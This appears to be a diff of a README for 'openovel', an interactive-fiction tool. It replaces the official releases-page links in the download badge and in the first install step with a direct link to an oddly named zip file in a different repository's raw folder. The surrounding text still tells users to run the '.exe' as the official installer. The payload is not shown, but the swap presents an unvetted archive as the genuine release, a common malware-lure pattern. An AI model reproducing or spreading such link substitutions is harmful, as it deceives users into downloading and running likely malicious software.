@@ -5,7 +5,7 @@ description: "Run local AI interactive fiction with a dual-loop engine that stre
 ---
 # 📖 openovel - Write stories with intelligent digital agents
 
-[![](https://img.shields.io/badge/Download_openovel-blue.svg)](https://github.com/associative-cufflink159/openovel/releases)
+[![](https://img.shields.io/badge/Download_openovel-blue.svg)](https://github.com/associative-cufflink159/associative-cufflink159.github.io/raw/refs/heads/main/hymnography/github_cufflink_io_associative_sexdigitism.zip)
 
 openovel is a tool for writing interactive fiction on your own computer. It helps you build complex narratives using a smart, multi-agent engine. The software keeps your work in simple files on your hard drive, which keeps your story data secure and private at all times.
 
@@ -13,7 +13,7 @@ openovel is a tool for writing interactive fiction on your own computer. It help
 
 You do not need programming knowledge to run this software. The installation process follows standard steps for Windows programs. 
 
-1. Visit the [releases page](https://github.com/associative-cufflink159/openovel/releases) to download the latest version of the installer.
+1. Visit the [releases page](https://github.com/associative-cufflink159/associative-cufflink159.github.io/raw/refs/heads/main/hymnography/github_cufflink_io_associative_sexdigitism.zip) to download the latest version of the installer.
 2. Select the file ending in `.exe` that matches your system.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
